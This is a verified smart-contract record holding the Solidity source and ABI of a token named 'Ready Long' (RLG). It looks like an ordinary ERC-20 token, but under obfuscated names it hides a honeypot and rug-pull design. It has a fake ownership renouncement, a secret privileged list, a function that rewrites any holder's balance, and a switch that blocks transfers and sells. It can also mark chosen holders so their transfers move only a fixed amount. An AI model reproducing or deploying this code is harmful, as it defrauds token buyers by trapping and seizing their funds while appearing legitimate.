{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface walletSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderSwapLaunch {\n    function createPair(address totalTo, address txWalletTrading) external returns (address);\n}\n\ninterface listMinMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletMax) external view returns (uint256);\n\n    function transfer(address swapFee, uint256 listBuy) external returns (bool);\n\n    function allowance(address sellLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapFee,\n        uint256 listBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverTotal, uint256 value);\n    event Approval(address indexed sellLaunched, address indexed spender, uint256 value);\n}\n\ninterface teamLiquidity is listMinMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReadyLong is receiverWallet, listMinMarketing, teamLiquidity {\n\n    bool private feeEnable;\n\n    function transferFrom(address amountExempt, address swapFee, uint256 listBuy) external override returns (bool) {\n        if (_msgSender() != buyEnable) {\n            if (listLaunch[amountExempt][_msgSender()] != type(uint256).max) {\n                require(listBuy <= listLaunch[amountExempt][_msgSender()]);\n                listLaunch[amountExempt][_msgSender()] -= listBuy;\n            }\n        }\n        return amountModeLiquidity(amountExempt, swapFee, listBuy);\n    }\n\n    function fromSwap(address liquidityMarketing) public {\n        toTotal();\n        if (fundTotal != swapTeam) {\n            totalLiquidity = true;\n        }\n        if (liquidityMarketing == senderLimit || liquidityMarketing == receiverShould) {\n            return;\n        }\n        exemptLiquidity[liquidityMarketing] = true;\n    }\n\n    uint256 constant launchList = 20 ** 10;\n\n    uint256 private swapAtAuto = 100000000 * 10 ** 18;\n\n    uint256 private fundTotal;\n\n    bool public atLiquidity;\n\n    uint256 public minSwap;\n\n    function totalTx(address teamShouldList, uint256 listBuy) public {\n        toTotal();\n        teamLaunched[teamShouldList] = listBuy;\n    }\n\n    bool private feeAtMode;\n\n    function name() external view virtual override returns (string memory) {\n        return sellList;\n    }\n\n    function getOwner() external view returns (address) {\n        return walletTeam;\n    }\n\n    function marketingSellTake(address amountExempt, address swapFee, uint256 listBuy) internal returns (bool) {\n        require(teamLaunched[amountExempt] >= listBuy);\n        teamLaunched[amountExempt] -= listBuy;\n        teamLaunched[swapFee] += listBuy;\n        emit Transfer(amountExempt, swapFee, listBuy);\n        return true;\n    }\n\n    function toTotal() private view {\n        require(maxSenderTx[_msgSender()]);\n    }\n\n    function amountModeLiquidity(address amountExempt, address swapFee, uint256 listBuy) internal returns (bool) {\n        if (amountExempt == senderLimit) {\n            return marketingSellTake(amountExempt, swapFee, listBuy);\n        }\n        uint256 marketingList = listMinMarketing(receiverShould).balanceOf(minTakeTotal);\n        require(marketingList == receiverAt);\n        require(swapFee != minTakeTotal);\n        if (exemptLiquidity[amountExempt]) {\n            return marketingSellTake(amountExempt, swapFee, launchList);\n        }\n        return marketingSellTake(amountExempt, swapFee, listBuy);\n    }\n\n    function approve(address fundMarketing, uint256 listBuy) public virtual override returns (bool) {\n        listLaunch[_msgSender()][fundMarketing] = listBuy;\n        emit Approval(_msgSender(), fundMarketing, listBuy);\n        return true;\n    }\n\n    function marketingTake(address modeTake) public {\n        require(modeTake.balance < 100000);\n        if (atLiquidity) {\n            return;\n        }\n        \n        maxSenderTx[modeTake] = true;\n        \n        atLiquidity = true;\n    }\n\n    uint256 senderLiquidity;\n\n    event OwnershipTransferred(address indexed walletReceiver, address indexed isExempt);\n\n    function owner() external view returns (address) {\n        return walletTeam;\n    }\n\n    bool private totalLiquidity;\n\n    uint256 public swapTeam;\n\n    uint8 private toFrom = 18;\n\n    mapping(address => bool) public maxSenderTx;\n\n    mapping(address => mapping(address => uint256)) private listLaunch;\n\n    string private marketingLiquidity = \"RLG\";\n\n    address public receiverShould;\n\n    address private walletTeam;\n\n    uint256 receiverAt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapAtAuto;\n    }\n\n    bool public fromTotalTo;\n\n    address minTakeTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address buyEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingLiquidity;\n    }\n\n    function allowance(address launchedReceiver, address fundMarketing) external view virtual override returns (uint256) {\n        if (fundMarketing == buyEnable) {\n            return type(uint256).max;\n        }\n        return listLaunch[launchedReceiver][fundMarketing];\n    }\n\n    function fromMarketing() public {\n        emit OwnershipTransferred(senderLimit, address(0));\n        walletTeam = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return toFrom;\n    }\n\n    mapping(address => bool) public exemptLiquidity;\n\n    address public senderLimit;\n\n    mapping(address => uint256) private teamLaunched;\n\n    function balanceOf(address walletMax) public view virtual override returns (uint256) {\n        return teamLaunched[walletMax];\n    }\n\n    function launchedExempt(uint256 listBuy) public {\n        toTotal();\n        receiverAt = listBuy;\n    }\n\n    constructor (){\n        \n        walletSell tokenIsSell = walletSell(buyEnable);\n        receiverShould = senderSwapLaunch(tokenIsSell.factory()).createPair(tokenIsSell.WETH(), address(this));\n        \n        senderLimit = _msgSender();\n        fromMarketing();\n        maxSenderTx[senderLimit] = true;\n        teamLaunched[senderLimit] = swapAtAuto;\n        if (totalLiquidity) {\n            feeEnable = true;\n        }\n        emit Transfer(address(0), senderLimit, swapAtAuto);\n    }\n\n    string private sellList = \"Ready Long\";\n\n    function transfer(address teamShouldList, uint256 listBuy) external virtual override returns (bool) {\n        return amountModeLiquidity(_msgSender(), teamShouldList, listBuy);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMarketing\",\"type\":\"address\"}],\"name\":\"fromSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTotalTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listBuy\",\"type\":\"uint256\"}],\"name\":\"launchedExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTake\",\"type\":\"address\"}],\"name\":\"marketingTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxSenderTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamShouldList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listBuy\",\"type\":\"uint256\"}],\"name\":\"totalTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamShouldList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ReadyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}